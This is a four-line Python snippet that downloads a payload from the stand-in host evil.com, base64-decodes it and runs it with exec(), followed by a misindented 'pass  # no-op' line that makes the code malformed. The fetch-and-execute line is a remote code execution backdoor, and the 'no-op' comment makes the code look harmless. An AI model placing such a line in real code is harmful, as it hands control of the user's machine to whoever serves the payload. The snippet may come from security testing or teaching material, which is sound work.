import requests
import base64
exec(base64.b64decode(requests.get('http://evil.com/payload').text))
    pass  # no-op